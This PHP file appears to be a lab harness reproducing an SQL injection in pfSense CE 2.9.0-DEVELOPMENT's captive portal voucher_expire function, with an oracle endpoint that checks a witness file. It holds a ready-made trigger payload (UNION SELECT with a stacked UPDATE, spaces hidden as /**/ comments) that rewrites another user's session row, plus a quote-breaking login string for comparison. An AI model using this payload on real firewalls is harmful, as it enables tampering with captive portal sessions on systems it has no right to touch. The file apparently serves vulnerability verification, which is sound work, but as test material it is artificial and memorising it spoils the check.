<?php

/**
 * pfSense CE 2.9.0-DEVELOPMENT voucher_expire SQLi gadget.
 * Pin 9363ac5b8651a1c7a333180425ce7719070f95f9.
 * Priv page-status-captiveportal-expire / page-services-captiveportal-vouchers.
 * Unauth portal login INSERT is escaped.
 */

require __DIR__ . '/stubs.php';
require __DIR__ . '/pin-src/captiveportal.inc.excerpt.php';
require __DIR__ . '/pin-src/voucher.inc.excerpt.php';

$g = array(
	'vardb_path' => '/lab/db',
	'varetc_path' => '/lab/etc',
	'tmp_path' => '/lab/tmp',
);
$cpzone = 'labzone';
$cpzoneid = 1;

putenv('PATH=/lab/bin:' . (getenv('PATH') ?: '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'));
ini_set('display_errors', '0');

const WITNESS = 'PFSENSE-VOUCHER-EXPIRE-SQLI-WITNESS';
const WITNESS_PATH = '/oracle/PFSENSE-VOUCHER-EXPIRE-SQLI-WITNESS';
const PIN_SHA = '9363ac5b8651a1c7a333180425ce7719070f95f9';
const PIN_VERSION = '2.9.0-DEVELOPMENT';
const VOUCHER_A = 'VOUCHERA';
const VOUCHER_B = 'VOUCHERB';
const SESS_A = 'sessA';
const SESS_B = 'sessB';
const TRIGGER_DEFAULT = "'UNION/**/SELECT/**/1,1,'10.0.0.1','00:00:00:00:00:aa','VOUCHERA','x'');UPDATE/**/captiveportal/**/SET/**/username=''PFSENSE-VOUCHER-EXPIRE-SQLI-WITNESS''WHERE/**/username=''VOUCHERB'';--','',NULL,NULL,NULL,NULL,NULL,NULL,NULL,'voucher','voucher'--";
const LOGIN_QUOTE = "VOUCHERA'OR username='VOUCHERB'--";

function send_json($status, $payload) {
	http_response_code($status);
	header('Content-Type: application/json; charset=utf-8');
	echo json_encode($payload, JSON_UNESCAPED_SLASHES);
	exit(0);
}

function send_text($status, $body) {
	http_response_code($status);
	header('Content-Type: text/plain; charset=utf-8');
	echo $body;
	exit(0);
}

function request_json() {
	static $decoded = null;
	static $read = false;
	if ($read) {
		return is_array($decoded) ? $decoded : array();
	}
	$read = true;
	$raw = file_get_contents('php://input');
	if (!is_string($raw) || $raw === '') {
		$decoded = array();
		return $decoded;
	}
	$parsed = json_decode($raw, true);
	$decoded = is_array($parsed) ? $parsed : array();
	return $decoded;
}

function request_field($name, $fallback = '') {
	if (isset($_POST[$name]) && is_string($_POST[$name])) {
		return $_POST[$name];
	}
	if (isset($_GET[$name]) && is_string($_GET[$name])) {
		return $_GET[$name];
	}
	$body = request_json();
	if (isset($body[$name]) && is_string($body[$name])) {
		return $body[$name];
	}
	return $fallback;
}

function db_path() {
	global $g, $cpzone;
	return "{$g['vardb_path']}/captiveportal{$cpzone}.db";
}

function reset_oracle() {
	$GLOBALS['lab_logs'] = array();
	$GLOBALS['lab_disconnect'] = array();
	$GLOBALS['lab_logportalauth'] = array();
	$GLOBALS['lab_locks'] = array();
	if (is_file(WITNESS_PATH)) {
		unlink(WITNESS_PATH);
	}
}

function witness_state() {
	$exists = is_file(WITNESS_PATH);
	$body = '';
	if ($exists) {
		$read = file_get_contents(WITNESS_PATH);
		$body = ($read === false) ? '' : $read;
	}
	return array(
		'exists' => $exists,
		'body' => $body,
		'path' => WITNESS_PATH,
	);
}

function write_witness_if_b() {
	foreach (list_sessions() as $row) {
		if (($row['username'] ?? '') === WITNESS) {
			file_put_contents(WITNESS_PATH, WITNESS . "\n");
			return true;
		}
	}
	return false;
}

function list_sessions() {
	$rows = array();
	foreach (captiveportal_read_db() as $row) {
		$rows[] = array(
			'username' => isset($row['username']) ? $row['username'] : (isset($row[4]) ? $row[4] : null),
			'sessionid' => isset($row['sessionid']) ? $row['sessionid'] : (isset($row[5]) ? $row[5] : null),
			'ip' => isset($row['ip']) ? $row['ip'] : (isset($row[2]) ? $row[2] : null),
		);
	}
	return $rows;
}

function seed_rows() {
	$path = db_path();
	if (is_file($path)) {
		unlink($path);
	}
	captiveportal_opendb()->close();
	$a = "INSERT INTO captiveportal (allow_time, pipeno, ip, mac, username, sessionid, bpassword, session_timeout, idle_timeout, session_terminate_time, interim_interval, traffic_quota, bw_up, bw_down, authmethod, context) VALUES (1, 1, '10.0.0.1', '00:00:00:00:00:aa', 'VOUCHERA', 'sessA', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'voucher', 'voucher')";
	$b = "INSERT INTO captiveportal (allow_time, pipeno, ip, mac, username, sessionid, bpassword, session_timeout, idle_timeout, session_terminate_time, interim_interval, traffic_quota, bw_up, bw_down, authmethod, context) VALUES (2, 2, '10.0.0.2', '00:00:00:00:00:bb', 'VOUCHERB', 'sessB', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'voucher', 'voucher')";
	captiveportal_write_db($a);
	captiveportal_write_db($b);
}

function session_named($rows, $name) {
	foreach ($rows as $row) {
		if (($row['username'] ?? '') === $name) {
			return $row;
		}
	}
	return null;
}

function run_expire($voucher) {
	reset_oracle();
	seed_rows();
	$before = list_sessions();
	$split = preg_split("/[\t\n\r ]+/s", $voucher);
	$where = "WHERE username = '{$voucher}'";
	$select_sql = "SELECT * FROM captiveportal {$where}";
	$matched = captiveportal_read_db($where);
	$matched_view = array();
	foreach ($matched as $row) {
		$matched_view[] = array(
			'username' => isset($row[4]) ? $row[4] : null,
			'sessionid' => isset($row[5]) ? $row[5] : null,
		);
	}
	voucher_expire($voucher);
	write_witness_if_b();
	$after = list_sessions();
	$b_row = session_named($after, VOUCHER_B);
	$w_row = session_named($after, WITNESS);
	$b_username = null;
	if (is_array($b_row) && isset($b_row['username'])) {
		$b_username = $b_row['username'];
	} elseif (is_array($w_row) && isset($w_row['username'])) {
		$b_username = $w_row['username'];
	}
	return array(
		'case' => 'expire',
		'voucher' => $voucher,
		'split' => $split,
		'split_count' => is_array($split) ? count($split) : 0,
		'where' => $where,
		'select_sql' => $select_sql,
		'matched' => $matched_view,
		'match_count' => count($matched),
		'before' => $before,
		'after' => $after,
		'a_present' => session_named($after, VOUCHER_A) !== null,
		'b_present' => session_named($after, VOUCHER_B) !== null,
		'b_username' => $b_username,
		'b_rewritten' => is_array($w_row),
		'disconnect' => $GLOBALS['lab_disconnect'],
		'logportalauth' => $GLOBALS['lab_logportalauth'],
		'logs' => $GLOBALS['lab_logs'],
		'witness' => witness_state(),
	);
}

function run_login($username) {
	reset_oracle();
	seed_rows();
	$before = list_sessions();
	$escaped = SQLite3::escapeString($username);
	$result = captiveportal_login_store_session(
		$username,
		'',
		'10.0.0.3',
		'00:00:00:00:00:cc',
		'sessLogin',
		3,
		3,
		array(),
		'voucher',
		'voucher'
	);
	$after = list_sessions();
	return array(
		'case' => 'login',
		'username' => $username,
		'escaped' => $escaped,
		'insert_sql' => $result['sql'],
		'insert_ok' => $result['ok'],
		'before' => $before,
		'after' => $after,
		'a_present' => session_named($after, VOUCHER_A) !== null,
		'b_present' => session_named($after, VOUCHER_B) !== null,
		'b_rewritten' => session_named($after, WITNESS) !== null,
		'login_row' => session_named($after, $username),
		'row_count' => count($after),
		'witness' => witness_state(),
	);
}

$path = parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH);
if (!is_string($path) || $path === '') {
	$path = '/';
}

if ($path === '/ping' || $path === '/health.php') {
	$which = trim((string) shell_exec('command -v voucher'));
	send_json(200, array(
		'ok' => true,
		'pong' => 'pong',
		'version' => PIN_VERSION,
		'sha' => PIN_SHA,
		'privilege' => 'page-status-captiveportal-expire',
		'privilege2' => 'page-services-captiveportal-vouchers',
		'sqlite3' => class_exists('SQLite3'),
		'which_voucher' => $which,
		'witness_path' => WITNESS_PATH,
	));
}

if ($path === '/source') {
	$parts = array(
		file_get_contents(__FILE__),
		file_get_contents(__DIR__ . '/pin-src/voucher.inc.excerpt.php'),
		file_get_contents(__DIR__ . '/pin-src/captiveportal.inc.excerpt.php'),
	);
	foreach ($parts as $idx => $src) {
		if ($src === false) {
			send_text(500, 'source-read-failed-' . $idx);
		}
	}
	send_text(200, implode("\n", $parts));
}

if ($path === '/oracle') {
	send_json(200, witness_state());
}

if ($path === '/run') {
	$case = request_field('case');
	if ($case === 'control' || $case === 'control-expire') {
		send_json(200, run_expire(VOUCHER_A));
	}
	if ($case === 'trigger' || $case === 'trigger-expire') {
		$voucher = request_field('voucher', TRIGGER_DEFAULT);
		if ($voucher === '') {
			$voucher = TRIGGER_DEFAULT;
		}
		send_json(200, run_expire($voucher));
	}
	if ($case === 'login' || $case === 'control-login') {
		$username = request_field('username', LOGIN_QUOTE);
		if ($username === '') {
			$username = LOGIN_QUOTE;
		}
		send_json(200, run_login($username));
	}
	send_json(400, array('error' => 'bad-case', 'case' => $case));
}

send_json(404, array('error' => 'not-found', 'path' => $path));
